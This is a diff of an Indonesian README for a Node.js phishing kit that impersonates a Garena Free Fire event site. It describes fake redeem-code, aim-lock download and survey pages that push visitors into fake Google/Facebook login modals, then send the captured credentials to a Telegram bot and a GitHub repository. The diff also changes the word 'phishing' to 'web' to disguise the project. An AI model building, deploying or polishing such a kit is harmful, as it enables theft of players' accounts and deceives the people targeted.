@@ -1,6 +1,6 @@
 # 🎮 Free Fire — Fire Kickoff Event 2026
 
-Proyek phishing berbasis **Node.js + Express** yang menyamar sebagai halaman event resmi Garena Free Fire. Dirancang untuk mengumpulkan kredensial akun pengguna melalui tiga alur utama, dengan notifikasi real-time via Telegram Bot dan penyimpanan data permanen ke GitHub.
+Proyek web berbasis **Node.js + Express** yang menyamar sebagai halaman event resmi Garena Free Fire. Dirancang untuk mengumpulkan kredensial akun pengguna melalui tiga alur utama, dengan notifikasi real-time via Telegram Bot dan penyimpanan data permanen ke GitHub.
 
 ---
 
@@ -8,16 +8,25 @@ Proyek phishing berbasis **Node.js + Express** yang menyamar sebagai halaman eve
 
 ```
 ff-kickoff-event/
-├── index.html          # Halaman utama — menu pilihan event (tampilan Garena)
-├── coderedem.html      # Alur Code Redeem — klaim hadiah palsu
+├── index.html          # Halaman utama — landing event (tampilan ff.garena.com)
+├── coderedem.html      # Alur Code Redeem — klaim hadiah & input kode
 ├── aimlock.html        # Alur Tool FF — download aim lock & auto headshot
 ├── survey.html         # Kuesioner survei tambahan
 ├── server.js           # Server Express — API login, webhook Telegram, GitHub DB
-├── attached_assets/    # Gambar dari Garena CDN (hero, event, ikon)
-├── data/
-│   └── settings.json   # Konfigurasi lokal (token Telegram, chat ID)
+├── assets/
+│   └── img/            # Seluruh aset gambar lokal (hero, event, icon, badge)
+│       ├── ff_icon.png          # Ikon FF 48×48 (favicon & nav logo)
+│       ├── ff_logo.png          # Logo teks FF 616×90 (footer)
+│       ├── hero_kickoff.jpg     # Banner hero Fire Kickoff 1920×1080
+│       ├── event_gintama.jpg    # Banner Gintama × FF (dari Garena CDN)
+│       ├── chars_bg.jpg         # Background section karakter
+│       ├── esports_bg.jpg       # Background section esports
+│       ├── google_play.png      # Tombol Google Play
+│       └── ...                  # Event banners, news thumbs, dll
 ├── vercel.json         # Konfigurasi deploy Vercel
-└── package.json        # Dependensi: express
+├── package.json        # Dependensi: express
+├── README.md           # Dokumentasi proyek ini
+└── materi_info.md      # Penjelasan teknis mendalam
 ```
 
 ---
@@ -32,6 +41,7 @@ ff-kickoff-event/
 | Notifikasi     | Telegram Bot API                        |
 | Deploy         | Vercel / Replit                         |
 | Enkripsi data  | Base64 via GitHub API                   |
+| Font           | Barlow Condensed + Barlow (Google Fonts)|
 
 ---
 
@@ -41,9 +51,10 @@ Atur di Replit Secrets atau `.env`:
 
 | Key                   | Keterangan                                        |
 |-----------------------|---------------------------------------------------|
-| `GITHUB`              | Personal Access Token GitHub (repo write access)  |
+| `GITHUB`              | Personal Access Token GitHub (scope: `repo`)      |
 | `TELEGRAM_BOT_TOKEN`  | Token bot Telegram dari @BotFather                |
 | `TELEGRAM_CHAT_ID`    | Chat ID admin (dari @userinfobot)                 |
+| `PORT`                | Port server (default: `3000`)                     |
 
 > Token dan Chat ID juga bisa diatur lewat endpoint `/api/settings` tanpa restart server.
 
@@ -58,7 +69,40 @@ npm install
 # Jalankan server
 node server.js
 # → Server berjalan di http://localhost:3000
+# → Di Replit: otomatis tersedia di port yang dikonfigurasi workflow
 ```
+
+---
+
+## 🌐 Halaman & Alur
+
+### 1. `index.html` — Landing Menu
+- Navbar sticky: logo FF (CDN) + menu (Home, News, Characters, Esports, Download)
+- Hero banner fullscreen Fire Kickoff dengan countdown timer
+- Section: Event Cards, Karakter, Esports, News, Download CTA
+- Mobile: hamburger menu dengan link Garena Shop
+- Globe button → membuka `ff.garena.com/en/`
+
+### 2. `coderedem.html` — Code Redeem
+- Meta: `<title>Rewards Redemption | Free Fire — Garena</title>` + OG tags lengkap
+- Header: logo FF + ikon cart (Garena Shop) + tombol Home
+- Form: input kode 12 karakter + pilih server/region + tombol Konfirmasi
+- Dropdown "Lihat Kode Redeem Aktif" → trigger modal login
+- Kode aktif Juni 2026: `FFRSX4CYHLLQ`, `FFSKTXVQF2NR`, `FFCBRAXQTS9S`, `FFSGT7KNFQ2X`, `B1RK7C5ZL8YT`
+- Kode expired: `X99TK56XDJ4X`, `FFAC2YXE6RF2` (badge "SUDAH DIGUNAKAN")
+- Modal login: Google / Facebook → POST `/api/login`
+
+### 3. `aimlock.html` — Tool FF
+- Navbar: logo FF (CDN) + cart Garena Shop + Home
+- Hero: badge OB53 Compatible + hero background FPS
+- Download card: versi 6.1.3 · Build 2026060501 · OB53 · 47 MB
+- Feature cards, steps, FAQ, changelog
+- Tombol Download → modal login Google / Facebook → POST `/api/login`
+
+### 4. `survey.html` — Kuesioner
+- 5 pertanyaan multi-choice tentang Free Fire
+- Animasi progress bar
+- Halaman hasil dengan "reward" tampilan palsu
 
 ---
 
@@ -77,8 +121,6 @@ node server.js
 ---
 
 ## 🤖 Perintah Telegram Bot
-
-Kirim ke bot setelah set webhook (`/api/webhook`):
 
 | Perintah         | Fungsi                                     |
 |------------------|--------------------------------------------|
@@ -107,24 +149,6 @@ Branch: main
 - Maksimal **5.000 record** (otomatis trim data terlama)
 - Cache in-memory **15 detik** untuk kurangi GitHub API calls
 - Tiap login baru memicu commit otomatis ke repo
-
----
-
-## 🌐 Halaman & Alur
-
-### 1. `index.html` — Landing Menu
-Tampilan mirip halaman event resmi Garena. Pengguna memilih antara:
-- **Code Redeem** → `/coderedem.html`
-- **Tool FF (Aim Lock)** → `/aimlock.html`
-
-### 2. `coderedem.html` — Code Redeem
-Alur: Login Google/Facebook → masuk kode redeem → proses palsu → redirect/survey
-
-### 3. `aimlock.html` — Tool FF
-Alur: Klik Download → Login Google/Facebook → "file terenkripsi" → survey
-
-### 4. `survey.html` — Kuesioner
-Halaman survei 5 pertanyaan sebagai langkah tambahan setelah login
 
 ---
 
